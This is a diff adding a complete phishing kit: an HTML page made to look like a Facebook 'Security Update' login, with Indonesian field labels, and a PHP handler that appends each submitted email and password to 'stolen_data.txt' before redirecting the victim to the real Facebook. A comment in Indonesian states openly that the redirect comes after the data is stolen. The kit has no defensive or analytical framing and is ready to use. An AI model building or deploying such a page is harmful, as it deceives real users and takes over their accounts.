@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Facebook - Security Update</title>
+    <style>
+        body { background: #f0f2f5; font-family: Arial; }
+        .container { 
+            background: white; 
+            width: 400px; 
+            margin: 100px auto; 
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .logo { text-align: center; }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+        }
+        input[type="submit"] {
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" width="200">
+        </div>
+        <form action="post.php" method="POST">
+            <input type="text" name="email" placeholder="Email atau nomor telepon" required>
+            <input type="password" name="password" placeholder="Kata sandi" required>
+            <input type="submit" value="Masuk">
+        </form>
+    </div>
+</body>
+</html>
+
+<?php
+// FILE post.php (SIMPAN DALAM FILE TERPISAH ATAU GABUNGIN DI ATAS)
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $data = "Email: " . $_POST['email'] . "\nPassword: " . $_POST['password'] . "\n\n";
+    file_put_contents('stolen_data.txt', $data, FILE_APPEND);
+    header('Location: https://facebook.com'); // ALIHKAN KE SITUS ASLI SETELAH NYOLONG DATA
+    exit();
+}
+?>
